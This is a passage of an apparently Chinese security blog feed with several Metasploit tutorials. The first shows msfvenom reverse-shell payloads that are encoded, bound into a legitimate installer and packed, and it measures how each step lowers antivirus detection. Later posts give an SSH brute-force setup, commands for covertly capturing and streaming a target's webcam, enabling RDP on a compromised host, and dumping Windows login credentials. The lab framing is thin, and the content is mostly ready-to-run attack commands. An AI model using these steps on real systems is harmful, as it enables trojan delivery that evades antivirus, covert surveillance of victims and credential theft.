&lt;h1 id=&#34;一、不处理payload直接生成样本进行检测&#34;&gt;&lt;a href=&#34;#一、不处理payload直接生成样本进行检测&#34; class=&#34;headerlink&#34; title=&#34;一、不处理payload直接生成样本进行检测&#34;&gt;&lt;/a&gt;一、不处理payload直接生成样本进行检测&lt;/h1&gt;&lt;p&gt;msfvenom -p windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp LHOST&amp;#x3D;192.168.110.32 LPORT&amp;#x3D;4456 -f exe -o payload1.exe&lt;/p&gt;
&lt;p&gt;![1645511560404](02 msf编码免杀.assets&amp;#x2F;1645511560404.png)&lt;/p&gt;
&lt;p&gt;进行查毒有41%的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;具体查毒链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yLnZpcnNjYW4ub3JnL2xhbmd1YWdlL2VuL3JlcG9ydC8yN2VhNTNiYWI0NGUwYTAyM2I1N2MyNzk5MWYwMmNmOQ==&#34;&gt;https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;![1645511550808](02 msf编码免杀.assets&amp;#x2F;1645511550808.png)&lt;/p&gt;
&lt;h1 id=&#34;二、-MSF自编码处理payload生成样本进行检测&#34;&gt;&lt;a href=&#34;#二、-MSF自编码处理payload生成样本进行检测&#34; class=&#34;headerlink&#34; title=&#34;二、 MSF自编码处理payload生成样本进行检测&#34;&gt;&lt;/a&gt;二、 MSF自编码处理payload生成样本进行检测&lt;/h1&gt;&lt;p&gt;首先我们输入   msfvenom –list encoders   查看可以用编码模块&lt;/p&gt;
&lt;p&gt;![1645511543145](02 msf编码免杀.assets&amp;#x2F;1645511543145.png)&lt;/p&gt;
&lt;p&gt;我们使用  x86&amp;#x2F;shikata_ga_nai 模块 免杀中使用频率最高的一个编码器&lt;/p&gt;
&lt;p&gt;msfvenom -p windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp -e x86&amp;#x2F;shikata_ga_nai HOST&amp;#x3D;192.168.110.110  LPORT&amp;#x3D;4456 -f exe -o payload1.exe&lt;/p&gt;
&lt;p&gt;进行查毒有37%的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;![1645511533351](02 msf编码免杀.assets&amp;#x2F;1645511533351.png)&lt;/p&gt;
&lt;h1 id=&#34;三、MSF自捆绑处理payload生成样本进行检测&#34;&gt;&lt;a href=&#34;#三、MSF自捆绑处理payload生成样本进行检测&#34; class=&#34;headerlink&#34; title=&#34;三、MSF自捆绑处理payload生成样本进行检测&#34;&gt;&lt;/a&gt;三、MSF自捆绑处理payload生成样本进行检测&lt;/h1&gt;&lt;p&gt;使用msfvenom的-x参数可以指定一个可执行文件,将payload与其捆绑&lt;/p&gt;
&lt;p&gt;msfvenom -p windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp LHOST&amp;#x3D;192.168.110.110 LPORT&amp;#x3D;4456 -x UltraISO.exe -f exe -o payload2.exe&lt;/p&gt;
&lt;p&gt;![1645511525813](02 msf编码免杀.assets&amp;#x2F;1645511525813.png)&lt;/p&gt;
&lt;p&gt;进行查毒有37%的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;![1645511516751](02 msf编码免杀.assets&amp;#x2F;1645511516751.png)&lt;/p&gt;
&lt;h1 id=&#34;四、MSF自捆绑-编码处理payload生成样本进行检测&#34;&gt;&lt;a href=&#34;#四、MSF自捆绑-编码处理payload生成样本进行检测&#34; class=&#34;headerlink&#34; title=&#34;四、MSF自捆绑+编码处理payload生成样本进行检测&#34;&gt;&lt;/a&gt;四、MSF自捆绑+编码处理payload生成样本进行检测&lt;/h1&gt;&lt;p&gt;结合第二种，第三种。编码方式我们再次生成样本&lt;/p&gt;
&lt;p&gt;msfvenom -p windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp LHOST&amp;#x3D;192.168.110.110 LPORT&amp;#x3D;4456 -e x86&amp;#x2F;shikata_ga_nai -x UltraISO.exe  -i 10 -f exe -o payload3.exe&lt;/p&gt;
&lt;p&gt;![1645511507586](02 msf编码免杀.assets&amp;#x2F;1645511507586.png)&lt;/p&gt;
&lt;p&gt;进行查毒有31%的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;![1645511497457](02 msf编码免杀.assets&amp;#x2F;1645511497457.png)&lt;/p&gt;
&lt;p&gt;那我们继续增加编码次数&lt;/p&gt;
&lt;p&gt;msfvenom -p windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp LHOST&amp;#x3D;192.168.110.110 LPORT&amp;#x3D;4456 -e x86&amp;#x2F;shikata_ga_nai -x UltraISO.exe  -i 20 -f exe -o payload4.exe&lt;/p&gt;
&lt;p&gt;进行查毒有27%的杀毒软件报毒了!&lt;/p&gt;
&lt;p&gt;![1645511487704](02 msf编码免杀.assets&amp;#x2F;1645511487704.png)&lt;/p&gt;
&lt;h1 id=&#34;五、MSF多重编码payload生成样本进行检测&#34;&gt;&lt;a href=&#34;#五、MSF多重编码payload生成样本进行检测&#34; class=&#34;headerlink&#34; title=&#34;五、MSF多重编码payload生成样本进行检测&#34;&gt;&lt;/a&gt;五、MSF多重编码payload生成样本进行检测&lt;/h1&gt;&lt;p&gt;通过管道，让msfvenom用不同编码器反复编码进行混淆。使用管道让msfvenom对攻击载荷多重编码，先用shikata_ga_nai编码10次，接着来10次的alpha_upper编码，再来10次的countdown编码，最后才生成以payload5.exe为模板的可执行文件。&lt;/p&gt;
&lt;p&gt;msfvenom  -p windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp -e x86&amp;#x2F;shikata_ga_nai -i 10 LHOST&amp;#x3D;192.168.110.110 LPORT&amp;#x3D;4456 -f raw | msfvenom -e x86&amp;#x2F;alpha_upper -i 10 -f raw | msfvenom -e x86&amp;#x2F;countdown -i 10 -x UltraISO.exe -f exe -o payload5.exe&lt;/p&gt;
&lt;h1 id=&#34;六、-生成Shellcode使用C语言调用&#34;&gt;&lt;a href=&#34;#六、-生成Shellcode使用C语言调用&#34; class=&#34;headerlink&#34; title=&#34;六、 生成Shellcode使用C语言调用&#34;&gt;&lt;/a&gt;六、 生成Shellcode使用C语言调用&lt;/h1&gt;&lt;p&gt;1、直接在linux中利用msf的meterpreter生成的文件以.c形式文件存储，得到机器码。命令：&lt;/p&gt;
&lt;p&gt;msfvenom -p windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp LHOST&amp;#x3D;192.168.110.110 LPORT&amp;#x3D;4456 -f c &amp;gt;c0001.c&lt;/p&gt;
&lt;p&gt;![1645511458128](02 msf编码免杀.assets&amp;#x2F;1645511458128.png)&lt;/p&gt;
&lt;p&gt;2、改c文件，并编译，并加壳&lt;/p&gt;
&lt;p&gt;![1645511469800](02 msf编码免杀.assets&amp;#x2F;1645511469800.png)&lt;/p&gt;
&lt;p&gt;随便写一个hello world&lt;/p&gt;
&lt;p&gt;main() {&lt;br&gt;printf(“hello world\n”);&lt;br&gt;}&lt;/p&gt;
&lt;p&gt;然后编译 并加壳&lt;/p&gt;
&lt;p&gt;vmp加壳工具&lt;/p&gt;
</content>
        <updated>2023-01-12T14:18:18.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/</id>
        <title>msf辅助模块</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/"/>
        <content type="html">&lt;p&gt;说明：我们知道msf辅助模块有上千个，主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ测试发掘漏洞、实施网络协议欺骗等&lt;/p&gt;
&lt;h1 id=&#34;一、怎么查询-Auxiliary辅助模块&#34;&gt;&lt;a href=&#34;#一、怎么查询-Auxiliary辅助模块&#34; class=&#34;headerlink&#34; title=&#34;一、怎么查询 Auxiliary辅助模块&#34;&gt;&lt;/a&gt;一、怎么查询 Auxiliary辅助模块&lt;/h1&gt;&lt;p&gt;我们可以通过以下命令查询所有 Auxiliary辅助模块&lt;/p&gt;
&lt;p&gt;use auxiliary&amp;#x2F; 或   show auxiliary&lt;/p&gt;
&lt;h1 id=&#34;二、-Auxiliary辅助模块分类&#34;&gt;&lt;a href=&#34;#二、-Auxiliary辅助模块分类&#34; class=&#34;headerlink&#34; title=&#34;二、 Auxiliary辅助模块分类&#34;&gt;&lt;/a&gt;二、 Auxiliary辅助模块分类&lt;/h1&gt;&lt;hr&gt;
&lt;h4 id=&#34;admin&#34;&gt;&lt;a href=&#34;#admin&#34; class=&#34;headerlink&#34; title=&#34;admin&#34;&gt;&lt;/a&gt;admin&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;&amp;#x2F;admin&amp;#x2F;android&lt;/p&gt;
&lt;p&gt;&amp;#x2F;admin&amp;#x2F;http&lt;/p&gt;
&lt;p&gt;&amp;#x2F;admin&amp;#x2F;mysql&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;admin&amp;#x2F;oracle&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;admin&amp;#x2F;vmware&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;admin&amp;#x2F;smb&amp;#x2F;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;dos&#34;&gt;&lt;a href=&#34;#dos&#34; class=&#34;headerlink&#34; title=&#34;dos&#34;&gt;&lt;/a&gt;dos&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;&amp;#x2F;dos&amp;#x2F;android&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;dos&amp;#x2F;http&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;dos&amp;#x2F;cisco&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;dos&amp;#x2F;dns&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;dos&amp;#x2F;smb&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;dos&amp;#x2F;windows&amp;#x2F;ftp&amp;#x2F;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;fuzzers&#34;&gt;&lt;a href=&#34;#fuzzers&#34; class=&#34;headerlink&#34; title=&#34;fuzzers&#34;&gt;&lt;/a&gt;fuzzers&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;&amp;#x2F;fuzzers&amp;#x2F;http&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;fuzzers&amp;#x2F;smb&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;gather&amp;#x2F;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;scanner&#34;&gt;&lt;a href=&#34;#scanner&#34; class=&#34;headerlink&#34; title=&#34;scanner&#34;&gt;&lt;/a&gt;scanner&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;portscan&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;ftp&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;http&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;ssh&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;smb&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;vmware&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;vnc&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;telnet&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;msyql&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;ntp&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;openvas&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;scanner&amp;#x2F;sap&amp;#x2F;&lt;/p&gt;
&lt;h4 id=&#34;server&#34;&gt;&lt;a href=&#34;#server&#34; class=&#34;headerlink&#34; title=&#34;server&#34;&gt;&lt;/a&gt;server&lt;/h4&gt;&lt;p&gt;&amp;#x2F;server&amp;#x2F;&lt;/p&gt;
&lt;h1 id=&#34;三、通过分类查询指定模块&#34;&gt;&lt;a href=&#34;#三、通过分类查询指定模块&#34; class=&#34;headerlink&#34; title=&#34;三、通过分类查询指定模块&#34;&gt;&lt;/a&gt;三、通过分类查询指定模块&lt;/h1&gt;&lt;p&gt;通过search查询指定模块&lt;/p&gt;
&lt;p&gt;search type:auxiliary name:smb&lt;/p&gt;
&lt;p&gt;type： 后门跟的的模块类型   name ： 后门跟的就是要搜的模块名&lt;/p&gt;
&lt;h1 id=&#34;四、怎么调用模块&#34;&gt;&lt;a href=&#34;#四、怎么调用模块&#34; class=&#34;headerlink&#34; title=&#34;四、怎么调用模块&#34;&gt;&lt;/a&gt;四、怎么调用模块&lt;/h1&gt;&lt;p&gt;我们调一个smb模块演示&lt;/p&gt;
&lt;p&gt;1 查询与SMB	相关的辅助模块&lt;/p&gt;
&lt;p&gt;search type:auxiliary name:smb&lt;/p&gt;
&lt;p&gt;2 加载一个ms17_010探测模块&lt;/p&gt;
&lt;p&gt;use auxiliary&amp;#x2F;scanner&amp;#x2F;smb&amp;#x2F;smb_ms17_010&lt;/p&gt;
&lt;p&gt;3 查看载入模块需要配置的参数&lt;/p&gt;
&lt;p&gt;show options&lt;/p&gt;
&lt;p&gt;![1645511393570](01 msf辅助模块.assets&amp;#x2F;1645511393570.png)&lt;/p&gt;
&lt;p&gt;set RHOSTS 192.168.110.110   (设定目标IP)&lt;/p&gt;
&lt;p&gt;set THREADS 10    （如果觉得探测过慢可以增加线程，根据电脑实际性能来不要配置太多 个人建议最大10）&lt;/p&gt;
&lt;p&gt;run （执行探测）&lt;/p&gt;
&lt;p&gt;![1645511404119](01 msf辅助模块.assets&amp;#x2F;1645511404119.png)&lt;/p&gt;
&lt;p&gt;![1645511415106](01 msf辅助模块.assets&amp;#x2F;1645511415106.png)&lt;/p&gt;
&lt;h1 id=&#34;五、更多&#34;&gt;&lt;a href=&#34;#五、更多&#34; class=&#34;headerlink&#34; title=&#34;五、更多&#34;&gt;&lt;/a&gt;五、更多&lt;/h1&gt;&lt;p&gt;1 whois查看域名或IP信息  （hu yi zi）&lt;/p&gt;
&lt;p&gt;whois &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iYWlkdS5jb20v&#34;&gt;www.baidu.com&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;whois 192.168.0.1&lt;/p&gt;
&lt;p&gt;2  利用辅助模块查找邮箱&lt;/p&gt;
&lt;p&gt;use auxiliary&amp;#x2F;gather&amp;#x2F;search_email_collector&lt;/p&gt;
&lt;p&gt;3 DNS枚举，使用auxiliary模块下的DNS枚举模块：&lt;/p&gt;
&lt;p&gt;use auxiliary&amp;#x2F;gather&amp;#x2F;enum_dns&lt;/p&gt;
&lt;p&gt;4 ssh爆破，使用auxiliary模块下的ssh_login&lt;/p&gt;
&lt;p&gt;use &amp;#x2F;auxiliary&amp;#x2F;scanner&amp;#x2F;ssh&amp;#x2F;ssh_login&lt;/p&gt;
&lt;p&gt;set RHOSTS 192.168.1.92   (设定目标IP)&lt;br&gt;set USERNAME root    （设定ssh登陆账户）&lt;br&gt;set PASS_FILE &amp;#x2F;kevin&amp;#x2F;ssh_passwd.txt   （设定暴力字典）&lt;br&gt;set THREADS 100           (线程设置为100)&lt;br&gt;show options                   (查看更改后的参数)12345&lt;/p&gt;
&lt;p&gt;run   开始爆破&lt;/p&gt;
</content>
        <updated>2023-01-12T14:10:07.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/</id>
        <title>后渗透之调摄像头</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/"/>
        <content type="html">&lt;h1 id=&#34;一、环境准备&#34;&gt;&lt;a href=&#34;#一、环境准备&#34; class=&#34;headerlink&#34; title=&#34;一、环境准备&#34;&gt;&lt;/a&gt;一、环境准备&lt;/h1&gt;&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台windiows靶机&lt;/p&gt;
&lt;p&gt;3 一台安卓设备，没有可以使用模拟器&lt;/p&gt;
&lt;h1 id=&#34;二、实战&#34;&gt;&lt;a href=&#34;#二、实战&#34; class=&#34;headerlink&#34; title=&#34;二、实战&#34;&gt;&lt;/a&gt;二、实战&lt;/h1&gt;&lt;p&gt;靶机获取到meterpreter后我们可以使用  webcam模块实现调用软，硬件摄像头&lt;/p&gt;
&lt;p&gt;webcam模块支持命令&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;模块名&lt;/th&gt;
&lt;th&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;webcam_list&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;列出靶机中的所有软，硬件摄像头列表，并编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;webcam_snap&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;可调用单个软，硬件摄像头拍照，默认调用第一个摄像头&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;webcam_stream&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;可调用单个软，硬件摄像头直播，默认调用第一个摄像头&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;1  webcam_list&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494100592.png&#34; alt=&#34;1644494100592&#34;&gt;&lt;/p&gt;
&lt;p&gt;2 webcam_snap  调用单个软，硬件摄像头拍照&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-h&lt;/td&gt;
&lt;td&gt;显示帮助&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;-i 1 “1”代表调用摄像头编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;-p&lt;/td&gt;
&lt;td&gt;-p  &amp;#x2F;root “root”设置存储路径&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;-q&lt;/td&gt;
&lt;td&gt;-q  100  “100” 表示存储图片的质量默认为 50&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;-v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494089950.png&#34; alt=&#34;1644494089950&#34;&gt;&lt;/p&gt;
&lt;p&gt;3 webcam_stream  调用单个软，硬件摄像头直播&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-h&lt;/td&gt;
&lt;td&gt;显示帮助&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-d&lt;/td&gt;
&lt;td&gt;-d 100  “100”&amp;#x3D;100秒   设置流持续时间为100秒   默认为1800&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;-i 1 “1”代表调用摄像头编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;-q&lt;/td&gt;
&lt;td&gt;-q 100  “100”指流质量 默认为50&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;-s&lt;/td&gt;
&lt;td&gt;-s live “live”指流文件路径  默认输出在当前目录（注意目录不存在不会自动创建）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;-f&lt;/td&gt;
&lt;td&gt;-f live  “live”指播放文件的存储地址  默认输出在当前目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;-v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
</content>
        <updated>2023-01-12T13:41:34.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/</id>
        <title>后渗透之远程监控Windows</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/"/>
        <content type="html">&lt;h1 id=&#34;一、环境准备&#34;&gt;&lt;a href=&#34;#一、环境准备&#34; class=&#34;headerlink&#34; title=&#34;一、环境准备&#34;&gt;&lt;/a&gt;一、环境准备&lt;/h1&gt;&lt;h4 id=&#34;1-rdesktop&#34;&gt;&lt;a href=&#34;#1-rdesktop&#34; class=&#34;headerlink&#34; title=&#34;1 rdesktop&#34;&gt;&lt;/a&gt;1 rdesktop&lt;/h4&gt;&lt;p&gt;在线安装  rdesktop&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Debian,Ubuntu,kali下使用以下命令&lt;/p&gt;
&lt;p&gt; apt-get install rdesktop&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Centos&amp;#x2F;RedHat可以通过yum命令&lt;/p&gt;
&lt;p&gt;yum -y install rdesktop&lt;/p&gt;
&lt;h4 id=&#34;2-一台windiows靶机（没有物理电脑可以使用虚拟机代替）&#34;&gt;&lt;a href=&#34;#2-一台windiows靶机（没有物理电脑可以使用虚拟机代替）&#34; class=&#34;headerlink&#34; title=&#34;2 一台windiows靶机（没有物理电脑可以使用虚拟机代替）&#34;&gt;&lt;/a&gt;2 一台windiows靶机（没有物理电脑可以使用虚拟机代替）&lt;/h4&gt;&lt;h4 id=&#34;3-MSF-Metasploit-Framework&#34;&gt;&lt;a href=&#34;#3-MSF-Metasploit-Framework&#34; class=&#34;headerlink&#34; title=&#34;3 MSF-Metasploit Framework&#34;&gt;&lt;/a&gt;3 MSF-Metasploit Framework&lt;/h4&gt;&lt;h1 id=&#34;二、实战&#34;&gt;&lt;a href=&#34;#二、实战&#34; class=&#34;headerlink&#34; title=&#34;二、实战&#34;&gt;&lt;/a&gt;二、实战&lt;/h1&gt;&lt;p&gt;1 使用rdesktop远程控制&lt;/p&gt;
&lt;p&gt;说明：rdesktop是linux下支持Windows远程桌面连接的客户端程序，在linux系统下可通过它远程访问Windows桌面，支持多种版本。rdesktop是sourceforge下支持GPL协议的一个开源项目，采用RDP（Remote Desktop Protocol,远程桌面协议），几乎可以连接windows的所有版本&lt;/p&gt;
&lt;p&gt;rdesktop常用参数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-u&lt;/td&gt;
&lt;td&gt;账户名&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-p&lt;/td&gt;
&lt;td&gt;密码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;-a 16&lt;/td&gt;
&lt;td&gt;指使用16位色显示远程画面&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;-f&lt;/td&gt;
&lt;td&gt;全屏模式（用&lt;strong&gt;Ctrl+Alt+Enter&lt;/strong&gt; 组合键退出全屏）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;-g&lt;/td&gt;
&lt;td&gt;设置分辨率 如 :   -g 1024x768&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;rdesktop -h&lt;/td&gt;
&lt;td&gt;查看rdesktop使用帮助&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;rdesktop -u 用户名 -p  密码  -f   IP&lt;/p&gt;
&lt;p&gt;rdesktop -u mb -p 123456 -f  -g 1024x720 192.168.110.24&lt;/p&gt;
&lt;p&gt;如果远程计算机没有启动远程功能我们可以在meterpreter中输入&lt;/p&gt;
&lt;p&gt;启动远程桌面协议：run post&amp;#x2F;windows&amp;#x2F;manage&amp;#x2F;enable_rdp&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;2 通过vnc远程 &lt;/p&gt;
&lt;p&gt;![1644493726723](26 后渗透远程控制.assets&amp;#x2F;1644493726723.png)&lt;/p&gt;
</content>
        <updated>2023-01-12T13:33:52.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/</id>
        <title>后渗透之获取登陆账号密码Windows</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/"/>
        <content type="html">&lt;h1 id=&#34;一、环境准备&#34;&gt;&lt;a href=&#34;#一、环境准备&#34; class=&#34;headerlink&#34; title=&#34;一、环境准备&#34;&gt;&lt;/a&gt;一、环境准备&lt;/h1&gt;&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台windiows靶机&lt;/p&gt;
&lt;h1 id=&#34;二、实战&#34;&gt;&lt;a href=&#34;#二、实战&#34; class=&#34;headerlink&#34; title=&#34;二、实战&#34;&gt;&lt;/a&gt;二、实战&lt;/h1&gt;&lt;p&gt;首先获得一个有SYSTEM权限的meterpreter&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493974746.png&#34; alt=&#34;1644493974746&#34;&gt;&lt;/p&gt;
&lt;p&gt;1 抓取自动登录账户密码&lt;/p&gt;
&lt;p&gt;2 导出SAM数据库本地账户密码文件&lt;/p&gt;
&lt;p&gt;3 导出密码哈希&lt;/p&gt;
&lt;p&gt;4 使用kiwi模块获取&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;1  很多人喜欢给在计算机设置自动登录 我们可以通过抓取自动登录的账户密码&lt;/p&gt;
&lt;p&gt;run windows&amp;#x2F;gather&amp;#x2F;credentials&amp;#x2F;windows_autologin&lt;/p&gt;
&lt;p&gt;如果提示这证明本机并没有配置自动登录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493985741.png&#34; alt=&#34;1644493985741&#34;&gt;&lt;/p&gt;
